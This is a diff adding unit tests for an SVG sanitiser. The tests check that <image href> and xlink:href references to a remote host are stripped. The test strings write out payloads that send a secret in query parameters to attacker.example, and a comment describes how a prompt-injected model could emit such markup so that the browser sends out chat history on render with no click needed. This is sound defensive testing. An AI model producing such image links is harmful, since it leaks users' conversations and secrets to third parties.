@@ -43,6 +43,28 @@ describe('toSafeSvg', () => {
     expect(safe).not.toContain('alert(1)');
   });
 
+  it('removes a remote <image href> zero-click exfiltration vector', () => {
+    // A prompt-injected model can emit an <image> whose URL smuggles chat
+    // history/secrets in query params; the browser auto-fetches it on render
+    // (zero-click exfil). The element and href must BOTH be gone.
+    const malicious =
+      '<svg viewBox="0 0 10 10"><image href="https://attacker.example/p?d=SECRET"/><rect width="8" height="8"/></svg>';
+    const safe = toSafeSvg(malicious).toLowerCase();
+    expect(safe).not.toContain('attacker.example');
+    expect(safe).not.toContain('<image');
+    expect(safe).not.toContain('href');
+    // legitimate geometry still survives the stricter sanitiser
+    expect(safe).toContain('rect');
+  });
+
+  it('removes an xlink:href remote reference too', () => {
+    const malicious =
+      '<svg><image xlink:href="https://attacker.example/x.png"/></svg>';
+    const safe = toSafeSvg(malicious).toLowerCase();
+    expect(safe).not.toContain('attacker.example');
+    expect(safe).not.toContain('xlink:href');
+  });
+
   it('passes a clean SVG through intact', () => {
     const clean =
       '<svg viewBox="0 0 100 100"><rect width="100" height="100"/><text x="10" y="20">ok</text></svg>';
